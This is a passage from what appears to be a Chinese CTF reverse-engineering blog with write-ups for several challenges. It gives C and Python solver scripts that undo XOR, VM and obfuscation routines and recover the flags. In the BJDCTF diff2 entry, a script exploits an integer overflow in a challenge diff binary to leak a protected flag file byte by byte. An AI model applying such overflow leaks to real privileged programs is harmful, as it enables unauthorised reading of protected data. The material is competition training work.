class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v7[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">char</span> v3[<span class="number">6</span>];</span><br><span class="line">    v3[<span class="number">0</span>] = <span class="number">101</span>;</span><br><span class="line">    v3[<span class="number">1</span>] = <span class="number">108</span>;</span><br><span class="line">    v3[<span class="number">2</span>] = <span class="number">99</span>;</span><br><span class="line">    v3[<span class="number">3</span>] = <span class="number">111</span>;</span><br><span class="line">    v3[<span class="number">4</span>] = <span class="number">109</span>;</span><br><span class="line">    v3[<span class="number">5</span>] = <span class="number">101</span>;</span><br><span class="line">    v7[<span class="number">0</span>] = <span class="number">51</span>;</span><br><span class="line">    v7[<span class="number">1</span>] = <span class="number">64</span>;</span><br><span class="line">    v7[<span class="number">2</span>] = <span class="number">49</span>;</span><br><span class="line">    v7[<span class="number">3</span>] = <span class="number">98</span>;</span><br><span class="line">    v7[<span class="number">4</span>] = <span class="number">59</span>;</span><br><span class="line">    v7[<span class="number">5</span>] = <span class="number">98</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">1024</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(flag,<span class="string">&quot;ACTF&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        flag[i+<span class="number">5</span>]=(v3[i]^v7[i])+<span class="number">35</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x,0x%x\n&quot;</span>,*(<span class="keyword">int32_t</span>*)(flag+<span class="number">5</span>),*(<span class="keyword">int16_t</span>*)(flag+<span class="number">9</span>));</span><br><span class="line">    <span class="keyword">uint8_t</span> r=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">5</span>;i&lt;<span class="number">11</span>;i++)&#123;</span><br><span class="line">        r^=flag[i];</span><br><span class="line">    &#125;</span><br><span class="line">    flag[<span class="number">11</span>]=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    <span class="comment">// knowo3</span></span><br><span class="line">    <span class="keyword">uint32_t</span> a[] = &#123;<span class="number">0x405100</span><span class="number">-0x405018</span>,<span class="number">0x405102</span><span class="number">-0x405018</span>,<span class="number">0x405102</span><span class="number">-0x405018</span>,<span class="number">0x405109</span><span class="number">-0x405018</span>,<span class="number">0x405100</span><span class="number">-0x405018</span>,<span class="number">0x4051D3</span><span class="number">-0x405018</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        flag[<span class="number">12</span>+i]=a[i]^(i+<span class="number">0x83</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// strcpy(&amp;flag[12],&quot;knowo3&quot;);</span></span><br><span class="line">    flag[<span class="number">18</span>]=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;flag[<span class="number">19</span>],<span class="string">&quot;5mcsM&lt;&quot;</span>);</span><br><span class="line">    flag[<span class="number">25</span>]=<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考资料-2"><a href="#参考资料-2" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://www.cnblogs.com/csuchenzc/p/13876127.html">buuoj[ACTF_Junior_2020]Splendid_MineCraft WriteUp</a></p>
<h2 id="rev-SUCTF2019-hardcpp"><a href="#rev-SUCTF2019-hardcpp" class="headerlink" title="[rev][SUCTF2019]hardcpp"></a>[rev][SUCTF2019]hardcpp</h2><ol>
<li>deflat去混淆</li>
<li>分析函数功能</li>
<li>v21=随机值</li>
<li>s[0]=’#’</li>
<li>s[v19]=enc[v19-1]</li>
<li>v21非1即0</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">calc</span><span class="params">(<span class="keyword">uint8_t</span> a,<span class="keyword">uint8_t</span> b,<span class="keyword">uint32_t</span> v21)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> v18 = v21 ^ a;</span><br><span class="line">    <span class="keyword">uint8_t</span> v17 = v18;</span><br><span class="line">    <span class="keyword">uint8_t</span> v16 = b;</span><br><span class="line">    <span class="keyword">uint8_t</span> v3 = v16%<span class="number">7</span>; </span><br><span class="line">    v18 = v17+v3;</span><br><span class="line">    <span class="keyword">uint8_t</span> v15 = v18;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> v14 =b;</span><br><span class="line">    <span class="keyword">uint8_t</span> v4 = v14^<span class="number">18</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> v13 = v4;</span><br><span class="line">    <span class="keyword">uint8_t</span> v5 = v13*<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> v12 = v5;</span><br><span class="line">    <span class="keyword">uint8_t</span> v6 = v12+<span class="number">2</span>;</span><br><span class="line">    v18 = v15^v6;</span><br><span class="line">    <span class="keyword">return</span> v18;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> a[] = &#123;<span class="number">0xf3</span>, <span class="number">0x2e</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xe1</span>, <span class="number">0x4c</span>, <span class="number">0x22</span>, <span class="number">0xd1</span>, <span class="number">0xf9</span>, <span class="number">0x8c</span>, <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xf4</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xa3</span>, <span class="number">0x90</span>, <span class="number">0xe</span>, <span class="number">0xa5</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">21</span>]=&#123;<span class="string">&#x27;#&#x27;</span>,<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> v21=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0x20</span>;j&lt;<span class="number">0x7f</span>;j++)&#123;</span><br><span class="line">            flag[i+<span class="number">1</span>]=j;</span><br><span class="line">            <span class="keyword">if</span>(calc(flag[i+<span class="number">1</span>],flag[i+v21<span class="number">-1</span>+<span class="number">1</span>],v21)==a[i])&#123;</span><br><span class="line">                flag[i+<span class="number">1</span>]=j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="rev-BJDCTF-2nd-diff2"><a href="#rev-BJDCTF-2nd-diff2" class="headerlink" title="[rev][BJDCTF 2nd]diff2"></a>[rev][BJDCTF 2nd]diff2</h2><p>存在整数溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; buf2[i] + buf1[i] &amp;&amp; i &lt; <span class="number">0x400</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = buf1[i];</span><br><span class="line">    <span class="keyword">if</span> ( v0 != buf2[i] )</span><br><span class="line">      <span class="keyword">return</span> v3 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">10</span> )</span><br><span class="line">      ++v3;</span><br></pre></td></tr></table></figure>

<p>这里如果buf[2]+buf[1]溢出为0，则产生误判</p>
<p>另外学习了scp传输文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">got=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">43</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x1</span>,<span class="number">0xff</span>):</span><br><span class="line">        cur=got+chr(j)</span><br><span class="line">        os.system(<span class="string">&quot;echo \&#x27;&quot;</span>+cur+<span class="string">&quot;\&#x27; &gt; /tmp/t&quot;</span>)</span><br><span class="line">        p = os.popen(<span class="string">&quot;/home/ctf/diff /tmp/t /home/ctf/flag&quot;</span>);</span><br><span class="line">        text = p.read()</span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> text==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            print(text)</span><br><span class="line">            got+=chr(<span class="number">0x100</span>-j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(got)</span><br></pre></td></tr></table></figure>

<h2 id="rev-1"><a href="#rev-1" class="headerlink" title="[rev]"></a>[rev]</h2><p><del>穷举一把梭</del></p>
<p>逆向算法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES,AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="comment"># from math import *</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">v6 = <span class="number">11</span></span><br><span class="line">v4=<span class="number">0</span></span><br><span class="line">res = [<span class="number">0xAF</span>,<span class="number">0xAA</span>,<span class="number">0xAD</span>,<span class="number">0xEB</span>,<span class="number">0xAE</span>,<span class="number">0xAA</span>,<span class="number">0xEC</span>,<span class="number">0xA4</span>,<span class="number">0xBA</span>,<span class="number">0xAF</span>,<span class="number">0xAE</span>,<span class="number">0xAA</span>,<span class="number">0x8A</span>,<span class="number">0xC0</span>,<span class="number">0xA7</span>,<span class="number">0xB0</span>,<span class="number">0xBC</span>,<span class="number">0x9A</span>,<span class="number">0xBA</span>,<span class="number">0xA5</span>,<span class="number">0xA5</span>,<span class="number">0xBA</span>,<span class="number">0xAF</span>,<span class="number">0xB8</span>,<span class="number">0x9D</span>,<span class="number">0xB8</span>,<span class="number">0xF9</span>,<span class="number">0xAE</span>,<span class="number">0x9D</span>,<span class="number">0xAB</span>,<span class="number">0xB4</span>,<span class="number">0xBC</span>,<span class="number">0xB6</span>,<span class="number">0xB3</span>,<span class="number">0x90</span>,<span class="number">0x9A</span>,<span class="number">0xA8</span>]</span><br><span class="line">print(len(res))</span><br><span class="line">res = res[::<span class="number">-1</span>]</span><br><span class="line">a = []</span><br><span class="line">cal = <span class="keyword">lambda</span> x: (<span class="number">1</span>&lt;&lt;(v4&amp;<span class="number">3</span>))+<span class="number">1</span>+(x^<span class="number">0x1c7</span>)</span><br><span class="line"><span class="comment"># a.append(res[0]^0xc7)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">37</span>):</span><br><span class="line">    <span class="comment"># for j in range(0x20,0x7f):</span></span><br><span class="line">    <span class="comment">#     v11 = cal(j)</span></span><br><span class="line">    <span class="comment">#     if (v11&amp;0xFF)==res[i]:</span></span><br><span class="line">    <span class="comment">#         v4+=v11</span></span><br><span class="line">    <span class="comment">#         a.append(j)</span></span><br><span class="line">    <span class="comment">#         break</span></span><br><span class="line">    f = res[i]-(<span class="number">1</span>&lt;&lt;(v4&amp;<span class="number">3</span>))</span><br><span class="line">    f = f<span class="number">-1</span></span><br><span class="line">    f^=<span class="number">0xc7</span></span><br><span class="line">    a.append(f)</span><br><span class="line">    v4+=cal(f)</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(str(bytes(a),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="rev-GWCTF-2019-babyvm"><a href="#rev-GWCTF-2019-babyvm" class="headerlink" title="[rev][GWCTF 2019]babyvm"></a>[rev][GWCTF 2019]babyvm</h2><ol>
<li><p>虚拟机</p>
</li>
<li><p>操作码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf5, 0xf1, 0xe1, 0x0, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x20, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x1, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x21, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x2, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x22, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x3, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x23, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x4, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x24, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x5, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x25, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x6, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x26, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x7, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x27, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x8, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x28, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x9, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x29, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xa, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2a, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xb, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2b, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xc, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2c, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xd, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2d, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xe, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2e, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xf, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2f, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x10, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x30, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x11, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x31, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x12, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x32, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x13, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x33, 0x0, 0x0, 0x0, 0xf4, 0x0, 0x0, 0x0,</span><br></pre></td></tr></table></figure>

<p>然而解出来不对，真正的操作码在这里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf5, 0xf1, 0xe1, 0x0, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x1, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x0, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x1, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x2, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x1, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x2, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x3, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x3, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x4, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x3, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x4, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x5, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x4, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x5, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x6, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x5, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x6, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x7, 0x0, 0x0, 0x0, 0xf1, 0xe3, 0x8, 0x0, 0x0, 0x0, 0xf1, 0xe5, 0xc, 0x0, 0x0, 0x0, 0xf6, 0xf7, 0xf1, 0xe4, 0x6, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x7, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x8, 0x0, 0x0, 0x0, 0xf1, 0xe3, 0x9, 0x0, 0x0, 0x0, 0xf1, 0xe5, 0xc, 0x0, 0x0, 0x0, 0xf6, 0xf7, 0xf1, 0xe4, 0x7, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x8, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x9, 0x0, 0x0, 0x0, 0xf1, 0xe3, 0xa, 0x0, 0x0, 0x0, 0xf1, 0xe5, 0xc, 0x0, 0x0, 0x0, 0xf6, 0xf7, 0xf1, 0xe4, 0x8, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xd, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x13, 0x0, 0x0, 0x0, 0xf8, 0xf1, 0xe4, 0xd, 0x0, 0x0, 0x0, 0xf1, 0xe7, 0x13, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xe, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x12, 0x0, 0x0, 0x0, 0xf8, 0xf1, 0xe4, 0xe, 0x0, 0x0, 0x0, 0xf1, 0xe7, 0x12, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xf, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x11, 0x0, 0x0, 0x0, 0xf8, 0xf1, 0xe4, 0xf, 0x0, 0x0, 0x0, 0xf1, 0xe7, 0x11, 0x0, 0x0, 0x0, 0xf4</span><br></pre></td></tr></table></figure></li>
<li><p>长度为21 </p>
</li>
<li><p>开始python脚本</p>
</li>
<li><p>sub_b5f为关键函数，控制哪几个数据进寄存器</p>
</li>
</ol>
<p>解题脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">opc = [<span class="number">0xf5</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x20</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x21</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x22</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x23</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x25</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x26</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x27</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x28</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x29</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2a</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2b</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, 